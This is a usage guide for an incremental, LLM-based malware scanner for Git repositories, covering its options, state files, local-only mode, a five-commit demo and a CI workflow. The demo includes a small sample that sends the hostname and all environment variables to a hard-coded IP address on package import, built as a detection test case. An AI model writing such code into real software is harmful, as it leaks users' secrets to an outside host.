# Incremental Malware Scanner - Usage Guide

Continuous scanning of a Git repository with the thesis system. The first scan analyses the whole
repository; every later scan (e.g. after each commit) re-runs the static analysis but sends to the LLM
**only the Behavior Chains that are new** - i.e. whose fingerprint has not been evaluated before. Code
that only moved or was re-formatted is not re-evaluated; the repository verdict is always computed over
**all** current chains, so malicious code added in an earlier commit keeps the repository flagged until it
is removed.

```
inference/
  incremental_scanner.py    the scanner (CLI)
  chain_fingerprint.py      fingerprint of a Behavior Chain (stable to moved lines / formatting)
```

## How a scan works

1. Only the code files of the repository are copied to a temporary folder (no `.git`, data, binaries,
   `node_modules`, virtual environments); CodeQL runs on that copy. Dependencies are never installed and the
   scanned code is never executed. Nothing is written into the repository except its state folder.
2. Behavior Chains → Hybrid RAG + prompt → LLM, exactly as in the thesis evaluation (same prompt, same
   aggregation). The LLM is chosen with `LLM_PROVIDER` in `.env`; with `lmstudio` the whole scan runs on
   the local machine (see Privacy).
3. Chains with a known fingerprint reuse their stored verdict; only the others are sent to the LLM.
   If the prompt, RAG mode, LLM or index changed since the stored verdicts, everything is evaluated again.
4. If `--prev-commit` is given and no code file changed (e.g. only documentation), the scan is skipped
   and the previous verdict is kept.

State, inside the scanned repository (commit it, or cache it between CI runs):
```
.malware_scan/
  baseline.json        fingerprint -> verdict of every evaluated chain, + the evaluation context
  last_scan.json       latest scan report (repository verdict, flagged chains, counts)
  scans/<commit>.json  one report per scanned commit
```

## Usage

```bash
# first scan, or a scan that re-evaluates everything
python3 inference/incremental_scanner.py --target /path/to/repo --package NAME --mode full

# later scans (incremental is the default)
python3 inference/incremental_scanner.py --target /path/to/repo --package NAME \
    --commit <new sha> --prev-commit <previously scanned sha> --fail-on-malicious
```

| Option | Meaning |
|---|---|
| `--mode full` / `incremental` | re-evaluate every chain / only new fingerprints (default) |
| `--commit`, `--prev-commit` | the scanned commit (default HEAD) and the previous one: changed files are reported, and a commit without code changes is skipped |
| `--state-dir DIR` | state folder (default `<target>/.malware_scan`) |
| `--fail-on-malicious` | exit code 2 if the repository is MALICIOUS, 3 if the evaluation is incomplete (for CI) |
| `--keep-workdir` | keep the temporary analysis folder |

Requirements: the thesis repository set up as in `PIPELINE.md` (venv, CodeQL, and `dataset/indexes/` -
from the GitHub Release if you did not build them).

## Privacy: fully local scanning

```bash
export LLM_PROVIDER=lmstudio LM_STUDIO_MODEL=google/gemma-4-26b-a4b   # LM Studio server running with the model
export HF_HUB_OFFLINE=1        # the embedding model is loaded from the local cache, no network check
python3 inference/incremental_scanner.py --target /path/to/repo --package NAME
```
No code, chain or prompt leaves the computer. A local model is slower (~20-35 s per new chain on an Apple
M5), which the incremental mode offsets: after the first scan, only new chains are evaluated.

## Try it yourself: a 5-commit demo

```bash
T=~/Documents/Thesis            # the thesis repository
D=~/scanner_demo; rm -rf $D; mkdir -p $D/mylib && cd $D && git init -q
printf 'import subprocess\n\n\ndef git_version():\n    return subprocess.run(["git", "describe"], capture_output=True, text=True).stdout\n' > mylib/__init__.py
echo "# mylib" > README.md && git add -A && git commit -qm "1 initial"
$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --mode full
#   -> 1 chain evaluated, BENIGN

P=$(git rev-parse HEAD); printf '# helpers\n\n\n' | cat - mylib/__init__.py > t && mv t mylib/__init__.py
git commit -qam "2 moved code"
$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --commit $(git rev-parse HEAD) --prev-commit $P
#   -> 0 chains sent to the LLM (same fingerprint), BENIGN

P=$(git rev-parse HEAD)
printf 'import os, socket, requests\n\n\ndef _report():\n    info = {"host": socket.gethostname(), "env": dict(os.environ)}\n    requests.post("http://45.9.148.21/collect", json=info)\n' > mylib/telemetry.py
printf '\nfrom .telemetry import _report\n_report()\n' >> mylib/__init__.py
git add -A && git commit -qm "3 telemetry"
$T/venv/bin/python $T/inference/incremental_scanner.py --target $D --package mylib --commit $(git rev-parse HEAD) --prev-commit $P --fail-on-malicious; echo "exit code: $?"
#   -> only the new chain goes to the LLM, repository MALICIOUS, exit code 2
```
(The demo code is only analysed statically, never executed.) Continue with a README-only commit (the scan
is skipped and the verdict stays MALICIOUS) and a commit that deletes `telemetry.py` (verdict back to BENIGN,
no LLM call). `.malware_scan/scans/` keeps one report per commit.

## Example GitHub Actions workflow (self-hosted runner)

A self-hosted runner (e.g. the analyst's own machine, with the thesis repository, CodeQL and optionally
LM Studio set up) keeps the code on that machine; the scan state is committed back to the repository.

```yaml
name: Malware Scan
on:
  push:
    branches: [main]
jobs:
  scan:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2                       # the previous commit is needed for git diff
      - name: Scan the new commit
        env:
          THESIS: /path/to/Thesis                # thesis repository on the runner (.env with LLM_PROVIDER)
        run: |
          $THESIS/venv/bin/python $THESIS/inference/incremental_scanner.py \
            --target . --package ${{ github.event.repository.name }} \
            --commit ${{ github.sha }} --prev-commit ${{ github.event.before }} --fail-on-malicious
      - name: Keep the scan state
        if: always()
        run: |
          git add .malware_scan && git commit -m "malware scan state [skip ci]" && git push || true
```
With a GitHub-hosted runner the same steps apply after installing CodeQL, the thesis repository and its
indexes, and using an API provider (`DEEPSEEK_API_KEY` as a repository secret).
